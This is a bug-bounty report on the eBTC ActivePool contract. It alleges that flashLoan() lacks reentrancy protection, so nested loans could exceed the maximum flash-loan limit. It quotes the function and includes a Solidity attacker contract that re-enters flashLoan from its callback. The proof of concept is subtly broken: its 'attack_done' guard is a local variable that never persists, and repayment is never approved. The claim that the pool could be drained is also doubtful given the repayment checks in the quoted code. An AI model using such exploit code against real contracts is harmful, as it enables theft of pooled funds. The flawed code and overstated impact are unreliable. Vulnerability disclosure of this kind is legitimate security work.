# 28605 - \[SC - Insight] Reentrancy on ActivePool allows users to borrow\...

Submitted on Feb 22nd 2024 at 12:24:10 UTC by @shanb1605 for [Boost | eBTC](https://immunefi.com/bounty/ebtc-boost/)

Report ID: #28605

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/ActivePool.sol>

Impacts:

* Smart contract unable to operate due to lack of token funds
* Temporary freezing of funds for at least 15 minutes
* Bypassing Max Limit of Flash Loan amount

## Description

## Brief/Intro

The `flashLoan()` allows users to borrow collateral on Active Pool. The amount that can be borrowed is limited to `maxFlashLoan(token)` means one can borrow within the maximum limit of the amount. This limit can be bypassed with a reentrant call on the `flashLoan()` function.

## Vulnerability Details

The ActivePool contract misses reentrancy protection on `flashLoan()` which leads to borrowing over the max borrow limit of the token.

```solidity
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external override returns (bool) {
        require(amount > 0, "ActivePool: 0 Amount");
        uint256 fee = flashFee(token, amount); // NOTE: Check for `token` is implicit in the requires above // also checks for paused
        require(amount <= maxFlashLoan(token), "ActivePool: Too much");

        uint256 amountWithFee = amount + fee;
        uint256 oldRate = collateral.getPooledEthByShares(DECIMAL_PRECISION);

        collateral.transfer(address(receiver), amount);

        require(
            receiver.onFlashLoan(msg.sender, token, amount, fee, data) == FLASH_SUCCESS_VALUE,
            "ActivePool: IERC3156: Callback failed"
        );

        collateral.transferFrom(address(receiver), address(this), amountWithFee);

        collateral.transfer(feeRecipientAddress, fee);

        require(
            collateral.balanceOf(address(this)) >= collateral.getPooledEthByShares(systemCollShares),
            "ActivePool: Must repay Balance"
        );
        require(
            collateral.sharesOf(address(this)) >= systemCollShares,
            "ActivePool: Must repay Share"
        );
        require(
            collateral.getPooledEthByShares(DECIMAL_PRECISION) == oldRate,
            "ActivePool: Should keep same collateral share rate"
        );

        emit FlashLoanSuccess(address(receiver), token, amount, fee);

        return true;
    }
```

## Impact Details

Bypass the max borrow amount and borrow until the Pool rans out of collateral.

## References

MakerDao has Reentrancy Protection on the FlashLoan module: <https://github.com/makerdao/dss-flash/blob/9d492aa6148c35f568400a1ab85cd6df43b2ccc8/src/flash.sol#L74>

<https://github.com/makerdao/dss-flash/blob/9d492aa6148c35f568400a1ab85cd6df43b2ccc8/src/flash.sol#L137>

## Proof of Concept

```solidity
pragma solidity ^0.8.0;

interface ActivePool {
    function flashLoan(address receiver,address token,uint256 amount,bytes calldata data) external;
}

contract FlashLoan_Receiver {
    bytes32 public constant FLASH_SUCCESS_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function call_Flashloan() external {
        ActivePool(address(1)).flashLoan(address(this), address(0xeee),12301300,"");
    }

    function onFlashLoan(address,address,uint256,uint256,bytes memory) external returns(bytes32) {
        some_actions();
        return FLASH_SUCCESS_VALUE;
    }

    function some_actions() internal {
        bool attack_done;
        if(!attack_done) {
            attack_done = true;
            ActivePool(address(1)).flashLoan(address(this), address(0xeee),12301300,"");
        }
    }

}
```

* First `call_Flashloan()` is executed to borrow max amount of tokens.
* Inside `onFlashLoan` `some_actions()` will executed to borrow again the collateral from ActivePool.
* It sets `attack_done = true` to prevent an unbounded loop.
* Further actions will be carried out with the Flash Loan amount.
